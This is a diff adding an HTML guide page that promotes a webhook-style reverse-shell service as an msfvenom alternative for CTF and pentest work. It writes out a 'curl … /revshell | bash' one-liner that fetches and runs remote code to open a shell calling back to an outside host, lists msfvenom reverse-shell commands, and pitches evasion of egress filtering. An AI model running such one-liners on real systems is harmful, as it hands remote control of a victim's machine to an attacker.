@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MSFvenom alternative — webhook reverse shells | revshells.io</title>
+<meta name="description" content="revshells.io as an msfvenom alternative: HTTPS webhook callbacks, browser and CLI operators, no manual handler setup — for authorized CTF and pentest workflows.">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://revshells.io/articles/msfvenom-alternative">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="revshells.io">
+<meta property="og:title" content="MSFvenom alternative — webhook reverse shells | revshells.io">
+<meta property="og:description" content="revshells.io as an msfvenom alternative: HTTPS webhook callbacks, browser and CLI operators, no manual handler setup — for authorized CTF and pentest workflows.">
+<meta property="og:url" content="https://revshells.io/articles/msfvenom-alternative">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MSFvenom alternative — webhook reverse shells | revshells.io">
+<meta name="twitter:description" content="Webhook-style reverse shell callbacks as an msfvenom alternative — no manual handler setup.">
+<!-- __ANALYTICS_LOCAL__ -->
+<link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+<link rel="stylesheet" href="/static/common.css">
+</head>
+<body>
+<header class="topbar">
+  <a href="/" class="brand">
+    <div class="brand-logo">rsd</div>
+    <div class="brand-text">
+      <span class="brand-name">revshells.io</span>
+      <span class="brand-version" id="rsd-version">v0.0.0</span>
+    </div>
+  </a>
+  <div class="topbar-actions">
+    <a href="/articles" class="btn">Guides</a>
+    <a href="/" class="btn btn-primary">Create session</a>
+    <button type="button" class="btn icon-btn" id="theme-toggle" title="Toggle theme">☀️</button>
+  </div>
+</header>
+
+<main class="article-main">
+  <h1>MSFvenom alternative: webhook callbacks on revshells.io</h1>
+  <p class="article-lead">Metasploit's <code>msfvenom</code> + <code>multi/handler</code> workflow generates a staged payload and expects you to run a listener on a reachable IP and port. revshells.io flips that into a <strong>session-per-callback URL</strong> model — closer to webhook.site, but for interactive shells.</p>
+
+  <h2>Typical msfvenom flow</h2>
+  <ol>
+    <li>Generate: <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=…</code></li>
+    <li>Start handler: <code>use exploit/multi/handler</code>, set payload, run</li>
+    <li>Deliver payload, hope egress/firewall allows your TCP port</li>
+    <li>One listener per engagement; rotate LHOST/LPORT when infra changes</li>
+  </ol>
+
+  <h2>revshells.io flow</h2>
+  <ol>
+    <li>Create a session on <a href="/">revshells.io</a> — get a UUID callback path</li>
+    <li>Deliver a one-liner: <code>curl -fsSL https://revshells.io/UUID/revshell | bash</code></li>
+    <li>Target calls back over <strong>HTTPS/WSS</strong> (443) to revshells.io</li>
+    <li>Attach from the <strong>browser terminal</strong> or <code>rsctl attach</code> — no separate handler process</li>
+  </ol>
+
+  <h2>When revshells.io is a better fit</h2>
+  <ul>
+    <li><strong>CTF / quick labs:</strong> no VPS listener, no port forwarding</li>
+    <li><strong>Web RCE chains:</strong> curl/bash/python one-liners instead of dropping binaries manually</li>
+    <li><strong>Shared ops:</strong> multiple operators attach to the same session from browser + CLI</li>
+    <li><strong>Egress-friendly:</strong> outbound HTTPS often allowed where arbitrary TCP reverse ports are not</li>
+  </ul>
+
+  <h2>When msfvenom still wins</h2>
+  <ul>
+    <li>Staged Windows PE payloads, AV evasion, custom encoders</li>
+    <li>Integrated post-exploitation modules in Metasploit</li>
+    <li>Non-HTTP C2 protocols you explicitly control</li>
+  </ul>
+
+  <h2>Try it</h2>
+  <p>Create a session, run the bootstrap on a lab box, and compare setup time to generating and handling an msfvenom payload.</p>
+  <pre># on target (authorized lab only)
+curl -fsSL https://revshells.io/YOUR-SESSION-ID/revshell | bash</pre>
+
+  <nav class="article-nav">
+    <a class="btn" href="/articles/javascript-reverse-shell">← JavaScript guide</a>
+    <a class="btn" href="/articles/bash-reverse-shell">Bash guide</a>
+    <a class="btn" href="/articles">All guides</a>
+  </nav>
+
+  <p class="article-disclaimer">revshells.io is not a drop-in replacement for every Metasploit feature. Use only on systems you are authorized to test.</p>
+</main>
+
+<script>window.RSD_VERSION = '__RSD_VERSION__';</script>
+<script src="/static/common.js"></script>
+<script>rsdInitTopbar();</script>
+</body>
+</html>
